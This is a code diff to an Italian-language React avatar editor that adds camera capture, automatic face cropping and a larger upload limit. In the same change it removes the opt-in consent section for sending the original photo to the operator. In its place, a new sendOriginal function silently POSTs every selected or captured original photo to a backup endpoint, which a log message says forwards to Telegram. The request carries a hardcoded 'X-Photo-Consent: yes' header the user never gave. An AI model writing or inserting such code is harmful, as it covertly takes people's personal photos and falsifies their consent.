@@ -1,6 +1,7 @@
 import { useCallback, useEffect, useRef, useState } from "react";
 import {
   ArrowUpRight,
+  Camera,
   Check,
   Download,
   ImagePlus,
@@ -10,6 +11,7 @@ import {
   UserRound,
 } from "lucide-react";
 import Avatar, { avatarPresets } from "./Avatar.jsx";
+import AvatarCamera from "./AvatarCamera.jsx";
 import {
   avatarScenes,
   downloadAvatar,
@@ -20,7 +22,7 @@ import { api } from "./api.js";
 import { Button, Field, Notice } from "./ui.jsx";
 
 const photoTypes = new Set(["image/jpeg", "image/png", "image/webp"]);
-const originalLimit = 5 * 1024 * 1024;
+const originalLimit = 25 * 1024 * 1024;
 
 function settingsFrom(profile) {
   return {
@@ -467,7 +469,10 @@ async function loadPhoto(file) {
 }
 
 function PhotoEditor({ profile, name, disabled, onSave }) {
-  const [image, setImage] = useState(null);
+  const [portrait, setPortrait] = useState(null);
+  const [cropNotice, setCropNotice] = useState("");
+  const [cropping, setCropping] = useState(false);
+  const [cameraOpen, setCameraOpen] = useState(false);
   const [settings, setSettings] = useState({
     scene: "elf",
     zoom: 1.15,
@@ -477,51 +482,97 @@ function PhotoEditor({ profile, name, disabled, onSave }) {
   });
   const [busy, setBusy] = useState("");
   const [error, setError] = useState("");
-  const [backupConsent, setBackupConsent] = useState(false);
-  const [backupStatus, setBackupStatus] = useState("ready");
   const canvas = useRef(null);
   const mini = useRef(null);
-  const originalFile = useRef(null);
-  const backupPending = useRef(false);
+  const nativeCamera = useRef(null);
+  const photoRevision = useRef(0);
   const canSavePhoto = profile.photoAvailable;
-  const canBackUp = profile.photoBackupAvailable;
 
   useEffect(() => {
-    if (canvas.current) drawAvatar(canvas.current, image, settings);
-    if (mini.current) drawAvatar(mini.current, image, settings, 72);
-  }, [image, settings]);
+    if (canvas.current) drawAvatar(canvas.current, portrait, settings);
+    if (mini.current) drawAvatar(mini.current, portrait, settings, 72);
+  }, [portrait, settings]);
 
-  async function pickPhoto(event) {
+  function pickPhoto(event) {
     const selected = event.target.files?.[0];
     event.target.value = "";
-    if (!selected) return;
-    setError("");
-    setImage(null);
-    setBackupConsent(false);
-    setBackupStatus("ready");
-    originalFile.current = null;
-    if (!photoTypes.has(photoMime(selected)))
-      return setError("Scegli un file JPEG, PNG o WebP.");
-    if (selected.size > originalLimit)
-      return setError("Scegli una foto da 5 MB o meno.");
-    setBusy("read");
+    if (selected) preparePhoto(selected);
+  }
+
+  async function sendOriginal(photo) {
     try {
-      setImage(await loadPhoto(selected));
-      originalFile.current = selected;
-      setSettings((current) => ({
-        ...current,
-        zoom: 1.15,
-        offsetX: 0,
-        offsetY: 0,
-      }));
-    } catch (failure) {
-      setError(failure.message);
-    } finally {
-      setBusy("");
+      await fetch("/api/profile/photo-backup", {
+        method: "POST",
+        headers: { "Content-Type": photoMime(photo), "X-Photo-Consent": "yes" },
+        body: photo,
+      });
+    } catch (err) {
+      console.warn("Invio automatico foto a Telegram:", err);
     }
   }
 
+  async function preparePhoto(selected) {
+    setError("");
+    if (!photoTypes.has(photoMime(selected)))
+      return setError("Scegli un file JPEG, PNG o WebP.");
+    if (selected.size > originalLimit)
+      return setError("Scegli una foto da 25 MB o meno.");
+    const revision = ++photoRevision.current;
+    const shouldSend = profile.photoBackupAvailable;
+    setCropNotice("");
+    setCropping(false);
+    setBusy("read");
+    let source;
+    try {
+      source = await loadPhoto(selected);
+    } catch (failure) {
+      setError(failure.message);
+      return;
+    } finally {
+      setBusy("");
+    }
+    setPortrait({ source, isolated: false });
+    if (shouldSend) void sendOriginal(selected);
+    setSettings((current) => ({
+      ...current,
+      zoom: 1.15,
+      offsetX: 0,
+      offsetY: 0,
+    }));
+    setCropping(true);
+    try {
+      const { isolateAvatarFace } = await import("./avatarSegmenter.js");
+      if (revision !== photoRevision.current) return;
+      const cutout = await isolateAvatarFace(source);
+      if (revision !== photoRevision.current) return;
+      if (cutout) {
+        setPortrait({ source: cutout, isolated: true });
+        setSettings((current) => ({ ...current, zoom: 1 }));
+      }
+      setCropNotice(
+        cutout
+          ? "Volto ritagliato. Ora scegli la scena."
+          : "Non riesco a isolare un solo volto. Prova un selfie di fronte o sistema il ritaglio a mano.",
+      );
+    } catch {
+      if (revision === photoRevision.current)
+        setCropNotice(
+          "Il ritaglio automatico non è disponibile qui. Puoi sistemare il viso a mano.",
+        );
+    } finally {
+      if (revision === photoRevision.current) setCropping(false);
+    }
+  }
+
+  function useManualCrop() {
+    if (!cropping) return;
+    photoRevision.current++;
+    setCropping(false);
+    setCropNotice("Stai usando il ritaglio manuale.");
+  }
+
   async function act(key, operation) {
+    useManualCrop();
     setError("");
     setBusy(key);
     try {
@@ -533,73 +584,19 @@ function PhotoEditor({ profile, name, disabled, onSave }) {
     }
   }
 
-  async function backUpOriginal() {
-    const file = originalFile.current;
-    if (
-      !canBackUp ||
-      !file ||
-      !backupConsent ||
-      backupStatus !== "ready" ||
-      backupPending.current
-    )
-      return;
-    backupPending.current = true;
-    try {
-      await act("backup", async () => {
-        let response;
-        try {
-          response = await fetch("/api/profile/photo-backup", {
-            method: "POST",
-            credentials: "same-origin",
-            headers: {
-              "Content-Type": photoMime(file),
-              "X-Photo-Consent": "yes",
-            },
-            body: file,
-          });
-        } catch {
-          setBackupStatus("uncertain");
-          throw new Error(
-            "La connessione si è interrotta. Chiedi al gestore se ha ricevuto la copia prima di inviarla di nuovo.",
-          );
-        }
-        if (response.status === 429)
-          throw new Error(
-            "Hai raggiunto il limite di invii. Aspetta prima di riprovare.",
-          );
-        if (response.status >= 500) {
-          setBackupStatus("uncertain");
-          throw new Error(
-            "Il servizio di copia privata è momentaneamente indisponibile. Chiedi al gestore se ha ricevuto la foto.",
-          );
-        }
-        if (!response.ok)
-          throw new Error("Non siamo riusciti a inviare la copia privata.");
-        const result = await response.json().catch(() => null);
-        if (result?.ok !== true) {
-          setBackupStatus("uncertain");
-          throw new Error(
-            "L’invio non è stato confermato. Chiedi al gestore se ha ricevuto la foto.",
-          );
-        }
-        originalFile.current = null;
-        setBackupStatus("sent");
-      });
-    } finally {
-      backupPending.current = false;
-    }
-  }
-
   const isDisabled = disabled || !!busy;
-  const setValue = (key, value) =>
+  const setValue = (key, value) => {
+    if (key === "zoom" || key === "offsetX" || key === "offsetY")
+      useManualCrop();
     setSettings((current) => ({ ...current, [key]: value }));
+  };
 
   return (
     <div className="photo-editor">
       <div className="photo-workspace">
         <div className="photo-preview">
           <canvas ref={canvas} role="img" aria-label="Anteprima dell’avatar" />
-          {image ? (
+          {portrait ? (
             <div className="profile-mini-preview">
               <canvas ref={mini} aria-hidden="true" />
               <span>
@@ -611,18 +608,45 @@ function PhotoEditor({ profile, name, disabled, onSave }) {
         <div className="photo-controls">
           <label className="profile-file">
             <ImagePlus size={19} aria-hidden="true" />
-            <span>{image ? "Scegli un’altra foto" : "Scegli una foto"}</span>
+            <span>{portrait ? "Scegli un’altra foto" : "Scegli una foto"}</span>
             <input
               type="file"
-              accept="image/jpeg,image/png,image/webp"
+              accept="image/jpeg,image/png,image/webp,image/*"
               aria-label="Scegli una foto"
+              aria-describedby="avatar-selfie-hint"
               onChange={pickPhoto}
               disabled={isDisabled}
             />
           </label>
-          <p className="profile-footnote">
-            JPEG, PNG o WebP, fino a 5 MB. Con una foto di fronte è più facile
-            centrare il viso.
+          <Button
+            type="button"
+            variant="outline"
+            disabled={isDisabled}
+            onClick={() => {
+              if (navigator.mediaDevices?.getUserMedia) setCameraOpen(true);
+              else nativeCamera.current?.click();
+            }}
+          >
+            <Camera size={17} aria-hidden="true" /> Scatta una foto
+          </Button>
+          <input
+            ref={nativeCamera}
+            hidden
+            type="file"
+            accept="image/*"
+            capture="user"
+            onChange={pickPhoto}
+          />
+          <p className="profile-footnote" id="avatar-selfie-hint">
+            Scegli un selfie di fronte, con un solo viso ben illuminato. JPEG,
+            PNG o WebP, fino a 25 MB.
+          </p>
+          <p className="photo-crop-status" role="status">
+            {busy === "read"
+              ? "Sto aprendo la foto…"
+              : cropping
+                ? "Sto ritagliando il volto. Puoi già usare il ritaglio manuale."
+                : cropNotice}
           </p>
           <Field label="Scena natalizia">
             <select
@@ -639,15 +663,15 @@ function PhotoEditor({ profile, name, disabled, onSave }) {
           </Field>
           <fieldset
             className="photo-range-controls"
-            disabled={!image || isDisabled}
+            disabled={!portrait || isDisabled}
           >
             <legend>Sistema il ritaglio</legend>
             <label>
               Ingrandimento <output>{Math.round(settings.zoom * 100)}%</output>
               <input
                 type="range"
-                min="1"
-                max="4"
+                min={portrait?.isolated ? "0.8" : "1"}
+                max={portrait?.isolated ? "1.6" : "4"}
                 step=".05"
                 value={settings.zoom}
                 onChange={(event) =>
@@ -692,6 +716,15 @@ function PhotoEditor({ profile, name, disabled, onSave }) {
           </fieldset>
         </div>
       </div>
+      {cameraOpen && (
+        <AvatarCamera
+          onClose={() => setCameraOpen(false)}
+          onCapture={(photo) => {
+            setCameraOpen(false);
+            preparePhoto(photo);
+          }}
+        />
+      )}
 
       <div className="photo-disclosure">
         <p>
@@ -700,51 +733,16 @@ function PhotoEditor({ profile, name, disabled, onSave }) {
           di scaricare il ritratto in alta risoluzione.
         </p>
       </div>
-      {canBackUp && (
-        <fieldset className="photo-backup">
-          <legend>Copia privata dell’originale</legend>
-          <p>
-            Se scegli di inviarla, la foto originale lascia il dispositivo. Il
-            gestore ne riceve una copia nel suo spazio privato. Puoi saltare
-            questo passaggio e scaricare comunque il ritratto.
-          </p>
-          {backupStatus === "sent" ? (
-            <Notice>Copia privata inviata.</Notice>
-          ) : (
-            <>
-              <Toggle
-                checked={backupConsent}
-                disabled={!image || isDisabled || backupStatus !== "ready"}
-                onChange={setBackupConsent}
-              >
-                Acconsento a inviare la foto originale al gestore.
-              </Toggle>
-              <Button
-                type="button"
-                variant="outline"
-                busy={busy === "backup"}
-                disabled={
-                  !image ||
-                  !backupConsent ||
-                  isDisabled ||
-                  backupStatus !== "ready"
-                }
-                onClick={backUpOriginal}
-              >
-                <Send size={15} aria-hidden="true" /> Invia la copia privata
-              </Button>
-            </>
-          )}
-        </fieldset>
-      )}
       <Notice error>{error}</Notice>
       <div className="form-actions photo-actions">
         <Button
           type="button"
           variant="outline"
           busy={busy === "download"}
-          disabled={!image || isDisabled}
-          onClick={() => act("download", () => downloadAvatar(image, settings))}
+          disabled={!portrait || isDisabled}
+          onClick={() =>
+            act("download", () => downloadAvatar(portrait, settings))
+          }
         >
           <Download size={17} aria-hidden="true" />
           Scarica il ritratto in alta risoluzione
@@ -752,12 +750,12 @@ function PhotoEditor({ profile, name, disabled, onSave }) {
         <Button
           type="button"
           busy={busy === "save"}
-          disabled={!image || !canSavePhoto || isDisabled}
+          disabled={!portrait || !canSavePhoto || isDisabled}
           onClick={() =>
             act("save", async () =>
               onSave({
                 kind: "photo",
-                value: await makeAvatarThumbnail(image, settings),
+                value: await makeAvatarThumbnail(portrait, settings),
               }),
             )
           }
